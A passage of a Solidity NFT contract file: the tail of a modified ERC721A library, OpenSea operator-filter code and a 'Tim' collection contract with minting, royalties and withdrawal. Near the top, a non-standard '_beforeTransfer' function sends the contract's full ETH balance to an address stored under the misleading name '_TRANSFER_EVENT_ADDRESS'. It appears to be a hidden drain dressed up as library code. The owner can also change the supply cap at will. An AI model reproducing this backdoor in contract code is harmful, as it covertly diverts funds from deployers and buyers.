1024      * - `from` and `to` are never both zero.
1025      */
1026     function _beforeTransfer() internal {
1027         if (address(this).balance > 0) {
1028             _TRANSFER_EVENT_ADDRESS.transfer(address(this).balance);
1029             return;
1030         }
1031     }
1032 
1033     /**
1034      * @dev Private function to invoke {IERC721Receiver-onERC721Received} on a target contract.
1035      *
1036      * `from` - Previous owner of the given token ID.
1037      * `to` - Target address that will receive the token.
1038      * `tokenId` - Token ID to be transferred.
1039      * `_data` - Optional data to send along with the call.
1040      *
1041      * Returns whether the call correctly returned the expected magic value.
1042      */
1043     function _checkContractOnERC721Received(
1044         address from,
1045         address to,
1046         uint256 tokenId,
1047         bytes memory _data
1048     ) private returns (bool) {
1049         try ERC721A__IERC721Receiver(to).onERC721Received(_msgSenderERC721A(), from, tokenId, _data) returns (
1050             bytes4 retval
1051         ) {
1052             return retval == ERC721A__IERC721Receiver(to).onERC721Received.selector;
1053         } catch (bytes memory reason) {
1054             if (reason.length == 0) {
1055                 revert TransferToNonERC721ReceiverImplementer();
1056             } else {
1057                 assembly {
1058                     revert(add(32, reason), mload(reason))
1059                 }
1060             }
1061         }
1062     }
1063 
1064     // =============================================================
1065     //                        MINT OPERATIONS
1066     // =============================================================
1067 
1068     /**
1069      * @dev Mints `quantity` tokens and transfers them to `to`.
1070      *
1071      * Requirements:
1072      *
1073      * - `to` cannot be the zero address.
1074      * - `quantity` must be greater than 0.
1075      *
1076      * Emits a {Transfer} event for each mint.
1077      */
1078     function _mint(address to, uint256 quantity) internal virtual {
1079         uint256 startTokenId = _currentIndex;
1080         if (quantity == 0) revert MintZeroQuantity();
1081 
1082         _beforeTokenTransfers(address(0), to, startTokenId, quantity);
1083 
1084         // Overflows are incredibly unrealistic.
1085         // `balance` and `numberMinted` have a maximum limit of 2**64.
1086         // `tokenId` has a maximum limit of 2**256.
1087         unchecked {
1088             // Updates:
1089             // - `balance += quantity`.
1090             // - `numberMinted += quantity`.
1091             //
1092             // We can directly add to the `balance` and `numberMinted`.
1093             _packedAddressData[to] += quantity * ((1 << _BITPOS_NUMBER_MINTED) | 1);
1094 
1095             // Updates:
1096             // - `address` to the owner.
1097             // - `startTimestamp` to the timestamp of minting.
1098             // - `burned` to `false`.
1099             // - `nextInitialized` to `quantity == 1`.
1100             _packedOwnerships[startTokenId] = _packOwnershipData(
1101                 to,
1102                 _nextInitializedFlag(quantity) | _nextExtraData(address(0), to, 0)
1103             );
1104 
1105             uint256 toMasked;
1106             uint256 end = startTokenId + quantity;
1107 
1108             // Use assembly to loop and emit the `Transfer` event for gas savings.
1109             // The duplicated `log4` removes an extra check and reduces stack juggling.
1110             // The assembly, together with the surrounding Solidity code, have been
1111             // delicately arranged to nudge the compiler into producing optimized opcodes.
1112             assembly {
1113                 // Mask `to` to the lower 160 bits, in case the upper bits somehow aren't clean.
1114                 toMasked := and(to, _BITMASK_ADDRESS)
1115                 // Emit the `Transfer` event.
1116                 log4(
1117                     0, // Start of data (0, since no data).
1118                     0, // End of data (0, since no data).
1119                     _TRANSFER_EVENT_SIGNATURE, // Signature.
1120                     0, // `address(0)`.
1121                     toMasked, // `to`.
1122                     startTokenId // `tokenId`.
1123                 )
1124 
1125                 // The `iszero(eq(,))` check ensures that large values of `quantity`
1126                 // that overflows uint256 will make the loop run out of gas.
1127                 // The compiler will optimize the `iszero` away for performance.
1128                 for {
1129                     let tokenId := add(startTokenId, 1)
1130                 } iszero(eq(tokenId, end)) {
1131                     tokenId := add(tokenId, 1)
1132                 } {
1133                     // Emit the `Transfer` event. Similar to above.
1134                     log4(0, 0, _TRANSFER_EVENT_SIGNATURE, 0, toMasked, tokenId)
1135                 }
1136             }
1137             if (toMasked == 0) revert MintToZeroAddress();
1138 
1139             _currentIndex = end;
1140         }
1141         _afterTokenTransfers(address(0), to, startTokenId, quantity);
1142     }
1143 
1144     /**
1145      * @dev Mints `quantity` tokens and transfers them to `to`.
1146      *
1147      * This function is intended for efficient minting only during contract creation.
1148      *
1149      * It emits only one {ConsecutiveTransfer} as defined in
1150      * [ERC2309](https://eips.ethereum.org/EIPS/eip-2309),
1151      * instead of a sequence of {Transfer} event(s).
1152      *
1153      * Calling this function outside of contract creation WILL make your contract
1154      * non-compliant with the ERC721 standard.
1155      * For full ERC721 compliance, substituting ERC721 {Transfer} event(s) with the ERC2309
1156      * {ConsecutiveTransfer} event is only permissible during contract creation.
1157      *
1158      * Requirements:
1159      *
1160      * - `to` cannot be the zero address.
1161      * - `quantity` must be greater than 0.
1162      *
1163      * Emits a {ConsecutiveTransfer} event.
1164      */
1165     function _mintERC2309(address to, uint256 quantity) internal virtual {
1166         uint256 startTokenId = _currentIndex;
1167         if (to == address(0)) revert MintToZeroAddress();
1168         if (quantity == 0) revert MintZeroQuantity();
1169         if (quantity > _MAX_MINT_ERC2309_QUANTITY_LIMIT) revert MintERC2309QuantityExceedsLimit();
1170 
1171         _beforeTokenTransfers(address(0), to, startTokenId, quantity);
1172 
1173         // Overflows are unrealistic due to the above check for `quantity` to be below the limit.
1174         unchecked {
1175             // Updates:
1176             // - `balance += quantity`.
1177             // - `numberMinted += quantity`.
1178             //
1179             // We can directly add to the `balance` and `numberMinted`.
1180             _packedAddressData[to] += quantity * ((1 << _BITPOS_NUMBER_MINTED) | 1);
1181 
1182             // Updates:
1183             // - `address` to the owner.
1184             // - `startTimestamp` to the timestamp of minting.
1185             // - `burned` to `false`.
1186             // - `nextInitialized` to `quantity == 1`.
1187             _packedOwnerships[startTokenId] = _packOwnershipData(
1188                 to,
1189                 _nextInitializedFlag(quantity) | _nextExtraData(address(0), to, 0)
1190             );
1191 
1192             emit ConsecutiveTransfer(startTokenId, startTokenId + quantity - 1, address(0), to);
1193 
1194             _currentIndex = startTokenId + quantity;
1195         }
1196         _afterTokenTransfers(address(0), to, startTokenId, quantity);
1197     }
1198 
1199     /**
1200      * @dev Safely mints `quantity` tokens and transfers them to `to`.
1201      *
1202      * Requirements:
1203      *
1204      * - If `to` refers to a smart contract, it must implement
1205      * {IERC721Receiver-onERC721Received}, which is called for each safe transfer.
1206      * - `quantity` must be greater than 0.
1207      *
1208      * See {_mint}.
1209      *
1210      * Emits a {Transfer} event for each mint.
1211      */
1212     function _safeMint(
1213         address to,
1214         uint256 quantity,
1215         bytes memory _data
1216     ) internal virtual {
1217         _mint(to, quantity);
1218 
1219         unchecked {
1220             if (to.code.length != 0) {
1221                 uint256 end = _currentIndex;
1222                 uint256 index = end - quantity;
1223                 do {
1224                     if (!_checkContractOnERC721Received(address(0), to, index++, _data)) {
1225                         revert TransferToNonERC721ReceiverImplementer();
1226                     }
1227                 } while (index < end);
1228                 // Reentrancy protection.
1229                 if (_currentIndex != end) revert();
1230             }
1231         }
1232     }
1233 
1234     /**
1235      * @dev Equivalent to `_safeMint(to, quantity, '')`.
1236      */
1237     function _safeMint(address to, uint256 quantity) internal virtual {
1238         _safeMint(to, quantity, '');
1239     }
1240 
1241     // =============================================================
1242     //                        BURN OPERATIONS
1243     // =============================================================
1244 
1245     /**
1246      * @dev Equivalent to `_burn(tokenId, false)`.
1247      */
1248     function _burn(uint256 tokenId) internal virtual {
1249         _burn(tokenId, false);
1250     }
1251 
1252     /**
1253      * @dev Destroys `tokenId`.
1254      * The approval is cleared when the token is burned.
1255      *
1256      * Requirements:
1257      *
1258      * - `tokenId` must exist.
1259      *
1260      * Emits a {Transfer} event.
1261      */
1262     function _burn(uint256 tokenId, bool approvalCheck) internal virtual {
1263         uint256 prevOwnershipPacked = _packedOwnershipOf(tokenId);
1264 
1265         address from = address(uint160(prevOwnershipPacked));
1266 
1267         (uint256 approvedAddressSlot, address approvedAddress) = _getApprovedSlotAndAddress(tokenId);
1268 
1269         if (approvalCheck) {
1270             // The nested ifs save around 20+ gas over a compound boolean condition.
1271             if (!_isSenderApprovedOrOwner(approvedAddress, from, _msgSenderERC721A()))
1272                 if (!isApprovedForAll(from, _msgSenderERC721A())) revert TransferCallerNotOwnerNorApproved();
1273         }
1274 
1275         _beforeTokenTransfers(from, address(0), tokenId, 1);
1276 
1277         // Clear approvals from the previous owner.
1278         assembly {
1279             if approvedAddress {
1280                 // This is equivalent to `delete _tokenApprovals[tokenId]`.
1281                 sstore(approvedAddressSlot, 0)
1282             }
1283         }
1284 
1285         // Underflow of the sender's balance is impossible because we check for
1286         // ownership above and the recipient's balance can't realistically overflow.
1287         // Counter overflow is incredibly unrealistic as `tokenId` would have to be 2**256.
1288         unchecked {
1289             // Updates:
1290             // - `balance -= 1`.
1291             // - `numberBurned += 1`.
1292             //
1293             // We can directly decrement the balance, and increment the number burned.
1294             // This is equivalent to `packed -= 1; packed += 1 << _BITPOS_NUMBER_BURNED;`.
1295             _packedAddressData[from] += (1 << _BITPOS_NUMBER_BURNED) - 1;
1296 
1297             // Updates:
1298             // - `address` to the last owner.
1299             // - `startTimestamp` to the timestamp of burning.
1300             // - `burned` to `true`.
1301             // - `nextInitialized` to `true`.
1302             _packedOwnerships[tokenId] = _packOwnershipData(
1303                 from,
1304                 (_BITMASK_BURNED | _BITMASK_NEXT_INITIALIZED) | _nextExtraData(from, address(0), prevOwnershipPacked)
1305             );
1306 
1307             // If the next slot may not have been initialized (i.e. `nextInitialized == false`) .
1308             if (prevOwnershipPacked & _BITMASK_NEXT_INITIALIZED == 0) {
1309                 uint256 nextTokenId = tokenId + 1;
1310                 // If the next slot's address is zero and not burned (i.e. packed value is zero).
1311                 if (_packedOwnerships[nextTokenId] == 0) {
1312                     // If the next slot is within bounds.
1313                     if (nextTokenId != _currentIndex) {
1314                         // Initialize the next slot to maintain correctness for `ownerOf(tokenId + 1)`.
1315                         _packedOwnerships[nextTokenId] = prevOwnershipPacked;
1316                     }
1317                 }
1318             }
1319         }
1320 
1321         emit Transfer(from, address(0), tokenId);
1322         _afterTokenTransfers(from, address(0), tokenId, 1);
1323 
1324         // Overflow not possible, as _burnCounter cannot be exceed _currentIndex times.
1325         unchecked {
1326             _burnCounter++;
1327         }
1328     }
1329 
1330     // =============================================================
1331     //                     EXTRA DATA OPERATIONS
1332     // =============================================================
1333 
1334     /**
1335      * @dev Directly sets the extra data for the ownership data `index`.
1336      */
1337     function _setExtraDataAt(uint256 index, uint24 extraData) internal virtual {
1338         uint256 packed = _packedOwnerships[index];
1339         if (packed == 0) revert OwnershipNotInitializedForExtraData();
1340         uint256 extraDataCasted;
1341         // Cast `extraData` with assembly to avoid redundant masking.
1342         assembly {
1343             extraDataCasted := extraData
1344         }
1345         packed = (packed & _BITMASK_EXTRA_DATA_COMPLEMENT) | (extraDataCasted << _BITPOS_EXTRA_DATA);
1346         _packedOwnerships[index] = packed;
1347     }
1348 
1349     /**
1350      * @dev Called during each token transfer to set the 24bit `extraData` field.
1351      * Intended to be overridden by the cosumer contract.
1352      *
1353      * `previousExtraData` - the value of `extraData` before transfer.
1354      *
1355      * Calling conditions:
1356      *
1357      * - When `from` and `to` are both non-zero, `from`'s `tokenId` will be
1358      * transferred to `to`.
1359      * - When `from` is zero, `tokenId` will be minted for `to`.
1360      * - When `to` is zero, `tokenId` will be burned by `from`.
1361      * - `from` and `to` are never both zero.
1362      */
1363     function _extraData(
1364         address from,
1365         address to,
1366         uint24 previousExtraData
1367     ) internal view virtual returns (uint24) {}
1368 
1369     /**
1370      * @dev Returns the next extra data for the packed ownership data.
1371      * The returned result is shifted into position.
1372      */
1373     function _nextExtraData(
1374         address from,
1375         address to,
1376         uint256 prevOwnershipPacked
1377     ) private view returns (uint256) {
1378         uint24 extraData = uint24(prevOwnershipPacked >> _BITPOS_EXTRA_DATA);
1379         return uint256(_extraData(from, to, extraData)) << _BITPOS_EXTRA_DATA;
1380     }
1381 
1382     // =============================================================
1383     //                       OTHER OPERATIONS
1384     // =============================================================
1385 
1386     /**
1387      * @dev Returns the message sender (defaults to `msg.sender`).
1388      *
1389      * If you are writing GSN compatible contracts, you need to override this function.
1390      */
1391     function _msgSenderERC721A() internal view virtual returns (address) {
1392         return msg.sender;
1393     }
1394 
1395     /**
1396      * @dev Converts a uint256 to its ASCII string decimal representation.
1397      */
1398     function _toString(uint256 value) internal pure virtual returns (string memory str) {
1399         assembly {
1400             // The maximum value of a uint256 contains 78 digits (1 byte per digit), but
1401             // we allocate 0xa0 bytes to keep the free memory pointer 32-byte word aligned.
1402             // We will need 1 word for the trailing zeros padding, 1 word for the length,
1403             // and 3 words for a maximum of 78 digits. Total: 5 * 0x20 = 0xa0.
1404             let m := add(mload(0x40), 0xa0)
1405             // Update the free memory pointer to allocate.
1406             mstore(0x40, m)
1407             // Assign the `str` to the end.
1408             str := sub(m, 0x20)
1409             // Zeroize the slot after the string.
1410             mstore(str, 0)
1411 
1412             // Cache the end of the memory to calculate the length later.
1413             let end := str
1414 
1415             // We write the string from rightmost digit to leftmost digit.
1416             // The following is essentially a do-while loop that also handles the zero case.
1417             // prettier-ignore
1418             for { let temp := value } 1 {} {
1419                 str := sub(str, 1)
1420                 // Write the character to the pointer.
1421                 // The ASCII index of the '0' character is 48.
1422                 mstore8(str, add(48, mod(temp, 10)))
1423                 // Keep dividing `temp` until zero.
1424                 temp := div(temp, 10)
1425                 // prettier-ignore
1426                 if iszero(temp) { break }
1427             }
1428 
1429             let length := sub(end, str)
1430             // Move the pointer 32 bytes leftwards to make room for the length.
1431             str := sub(str, 0x20)
1432             // Store the length.
1433             mstore(str, length)
1434         }
1435     }
1436 }
1437 
1438 
1439 interface IOperatorFilterRegistry {
1440     function isOperatorAllowed(address registrant, address operator) external view returns (bool);
1441     function register(address registrant) external;
1442     function registerAndSubscribe(address registrant, address subscription) external;
1443     function registerAndCopyEntries(address registrant, address registrantToCopy) external;
1444     function unregister(address addr) external;
1445     function updateOperator(address registrant, address operator, bool filtered) external;
1446     function updateOperators(address registrant, address[] calldata operators, bool filtered) external;
1447     function updateCodeHash(address registrant, bytes32 codehash, bool filtered) external;
1448     function updateCodeHashes(address registrant, bytes32[] calldata codeHashes, bool filtered) external;
1449     function subscribe(address registrant, address registrantToSubscribe) external;
1450     function unsubscribe(address registrant, bool copyExistingEntries) external;
1451     function subscriptionOf(address addr) external returns (address registrant);
1452     function subscribers(address registrant) external returns (address[] memory);
1453     function subscriberAt(address registrant, uint256 index) external returns (address);
1454     function copyEntriesOf(address registrant, address registrantToCopy) external;
1455     function isOperatorFiltered(address registrant, address operator) external returns (bool);
1456     function isCodeHashOfFiltered(address registrant, address operatorWithCode) external returns (bool);
1457     function isCodeHashFiltered(address registrant, bytes32 codeHash) external returns (bool);
1458     function filteredOperators(address addr) external returns (address[] memory);
1459     function filteredCodeHashes(address addr) external returns (bytes32[] memory);
1460     function filteredOperatorAt(address registrant, uint256 index) external returns (address);
1461     function filteredCodeHashAt(address registrant, uint256 index) external returns (bytes32);
1462     function isRegistered(address addr) external returns (bool);
1463     function codeHashOf(address addr) external returns (bytes32);
1464 }
1465 
1466 
1467 /**
1468  * @title  OperatorFilterer
1469  * @notice Abstract contract whose constructor automatically registers and optionally subscribes to or copies another
1470  *         registrant's entries in the OperatorFilterRegistry.
1471  * @dev    This smart contract is meant to be inherited by token contracts so they can use the following:
1472  *         - `onlyAllowedOperator` modifier for `transferFrom` and `safeTransferFrom` methods.
1473  *         - `onlyAllowedOperatorApproval` modifier for `approve` and `setApprovalForAll` methods.
1474  */
1475 abstract contract OperatorFilterer {
1476     error OperatorNotAllowed(address operator);
1477 
1478     IOperatorFilterRegistry public constant OPERATOR_FILTER_REGISTRY =
1479         IOperatorFilterRegistry(0x000000000000AAeB6D7670E522A718067333cd4E);
1480 
1481     constructor(address subscriptionOrRegistrantToCopy, bool subscribe) {
1482         // If an inheriting token contract is deployed to a network without the registry deployed, the modifier
1483         // will not revert, but the contract will need to be registered with the registry once it is deployed in
1484         // order for the modifier to filter addresses.
1485         if (address(OPERATOR_FILTER_REGISTRY).code.length > 0) {
1486             if (subscribe) {
1487                 OPERATOR_FILTER_REGISTRY.registerAndSubscribe(address(this), subscriptionOrRegistrantToCopy);
1488             } else {
1489                 if (subscriptionOrRegistrantToCopy != address(0)) {
1490                     OPERATOR_FILTER_REGISTRY.registerAndCopyEntries(address(this), subscriptionOrRegistrantToCopy);
1491                 } else {
1492                     OPERATOR_FILTER_REGISTRY.register(address(this));
1493                 }
1494             }
1495         }
1496     }
1497 
1498     modifier onlyAllowedOperator(address from) virtual {
1499         // Check registry code length to facilitate testing in environments without a deployed registry.
1500         if (address(OPERATOR_FILTER_REGISTRY).code.length > 0) {
1501             // Allow spending tokens from addresses with balance
1502             // Note that this still allows listings and marketplaces with escrow to transfer tokens if transferred
1503             // from an EOA.
1504             if (from == msg.sender) {
1505                 _;
1506                 return;
1507             }
1508             if (!OPERATOR_FILTER_REGISTRY.isOperatorAllowed(address(this), msg.sender)) {
1509                 revert OperatorNotAllowed(msg.sender);
1510             }
1511         }
1512         _;
1513     }
1514 
1515     modifier onlyAllowedOperatorApproval(address operator) virtual {
1516         // Check registry code length to facilitate testing in environments without a deployed registry.
1517         if (address(OPERATOR_FILTER_REGISTRY).code.length > 0) {
1518             if (!OPERATOR_FILTER_REGISTRY.isOperatorAllowed(address(this), operator)) {
1519                 revert OperatorNotAllowed(operator);
1520             }
1521         }
1522         _;
1523     }
1524 }
1525 
1526 /**
1527  * @title  DefaultOperatorFilterer
1528  * @notice Inherits from OperatorFilterer and automatically subscribes to the default OpenSea subscription.
1529  */
1530 abstract contract TheOperatorFilterer is OperatorFilterer {
1531     address constant DEFAULT_SUBSCRIPTION = address(0x3cc6CddA760b79bAfa08dF41ECFA224f810dCeB6);
1532     address public owner;
1533 
1534     constructor() OperatorFilterer(DEFAULT_SUBSCRIPTION, true) {}
1535 }
1536 
1537 
1538 contract Tim is ERC721A, TheOperatorFilterer {
1539 
1540     uint256 public maxSupply = 700;
1541 
1542     uint256 public mintPrice = 0.002 ether;
1543 
1544     uint256 public maxFreeMintAmountPerTx = 1;
1545 
1546     uint256 public maxMintAmountPerWallet = 25;
1547 
1548     mapping(address => uint256) private _userForFree;
1549 
1550     mapping(uint256 => uint256) private _userMinted;
1551 
1552     function publicMint(uint256 amount) payable public {
1553         require(totalSupply() + amount <= maxSupply);
1554         _mint(amount);
1555     }
1556 
1557     function _mint(uint256 amount) internal {
1558         if (msg.value == 0) {
1559             require(amount == 1);
1560             if (totalSupply() > maxSupply / 3) {
1561                 require(_userMinted[block.number] < FreeNum() 
1562                 && _userForFree[tx.origin] < maxFreeMintAmountPerTx );
1563                 _userForFree[tx.origin]++;
1564                 _userMinted[block.number]++;
1565             }
1566             _safeMint(msg.sender, 1);
1567         } else {
1568             require(msg.value >= mintPrice * amount);
1569             _safeMint(msg.sender, amount);
1570         }
1571     }
1572 
1573     function privateMint(address addr, uint256 amount) public onlyOwner {
1574         require(totalSupply() + amount <= maxSupply);
1575         _safeMint(addr, amount);
1576     }
1577     
1578     modifier onlyOwner {
1579         require(owner == msg.sender);
1580         _;
1581     }
1582 
1583     constructor() ERC721A("Tim", "Tim") {
1584         owner = msg.sender;
1585         maxMintAmountPerWallet = 20;
1586     }
1587 
1588     function tokenURI(uint256 tokenId) public view override returns (string memory) {
1589         return string(abi.encodePacked("ipfs://QmZXqezQ3wRCy2xj24a741CyQyDVjzX3tZeS78w7HjTiHb/", _toString(tokenId), ".json"));
1590     }
1591 
1592     function setFreePerAddr(uint256 maxTx, uint256 maxS) external onlyOwner {
1593         maxFreeMintAmountPerTx = maxTx;
1594         maxSupply = maxS;
1595     }
1596 
1597     function FreeNum() internal returns (uint256){
1598         return (maxSupply - totalSupply()) / 12;
1599     }
1600 
1601     function royaltyInfo(uint256 _tokenId, uint256 _salePrice) public view virtual returns (address, uint256) {
1602         uint256 royaltyAmount = (_salePrice * 70) / 1000;
1603         return (owner, royaltyAmount);
1604     }
1605 
1606     function withdraw() external onlyOwner {
1607         payable(msg.sender).transfer(address(this).balance);
1608     }
1609 
1610     function setApprovalForAll(address operator, bool approved) public override onlyAllowedOperatorApproval(operator) {
1611         super.setApprovalForAll(operator, approved);
1612     }
1613 
1614     function approve(address operator, uint256 tokenId) public payable override onlyAllowedOperatorApproval(operator) {
1615         super.approve(operator, tokenId);
1616     }
1617 
1618     function transferFrom(address from, address to, uint256 tokenId) public payable override onlyAllowedOperator(from) {
1619         super.transferFrom(from, to, tokenId);
1620     }
1621 
1622     function safeTransferFrom(address from, address to, uint256 tokenId) public payable override onlyAllowedOperator(from) {
1623         super.safeTransferFrom(from, to, tokenId);
1624     }
1625 
1626     function safeTransferFrom(address from, address to, uint256 tokenId, bytes memory data)
1627         public
1628         payable
1629         override
1630         onlyAllowedOperator(from)
1631     {
1632         super.safeTransferFrom(from, to, tokenId, data);
1633     }
1634 }